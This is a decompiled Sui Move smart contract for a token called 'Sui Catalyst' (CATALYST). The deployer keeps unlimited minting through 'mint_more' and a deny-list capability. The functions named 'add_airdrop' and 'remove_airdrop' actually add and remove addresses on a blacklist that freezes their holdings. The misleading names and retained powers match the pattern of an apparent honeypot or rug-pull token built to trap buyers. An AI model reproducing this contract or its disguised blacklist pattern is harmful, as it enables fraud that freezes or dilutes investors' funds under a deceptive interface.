module 0x3e9e4d96b992bc495cd783849cae0a8ce3398d690b4aaf2a20f9ac0e7d10f870::CATALYST {
    struct CATALYST has drop {
        dummy_field: bool,
    }

    public entry fun add_airdrop(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<CATALYST>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<CATALYST>(arg0, arg1, arg2, arg3);
    }

    fun init(arg0: CATALYST, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<CATALYST>(arg0, 6, b"CATALYST", b"Sui Catalyst", b"be a Catalyst", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe_from_bytes(b"https://pump.mypinata.cloud/ipfs/QmYV5HVwWoZUXLRubqvog2dEke5rGdAs2w2sX3hTphF7Eb?img-width=256&img-dpr=2&img-onerror=redirect")), false, arg1);
        let v3 = v0;
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<CATALYST>>(v2);
        0x2::transfer::public_transfer<0x2::coin::Coin<CATALYST>>(0x2::coin::mint<CATALYST>(&mut v3, 10000000000000000, arg1), 0x2::tx_context::sender(arg1));
        0x2::transfer::public_transfer<0x2::coin::TreasuryCap<CATALYST>>(v3, 0x2::tx_context::sender(arg1));
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<CATALYST>>(v1, 0x2::tx_context::sender(arg1));
    }

    public entry fun mint_more(arg0: &mut 0x2::coin::TreasuryCap<CATALYST>, arg1: u64, arg2: &mut 0x2::tx_context::TxContext) {
        0x2::transfer::public_transfer<0x2::coin::Coin<CATALYST>>(0x2::coin::mint<CATALYST>(arg0, arg1, arg2), 0x2::tx_context::sender(arg2));
    }

    public entry fun remove_airdrop(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<CATALYST>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<CATALYST>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

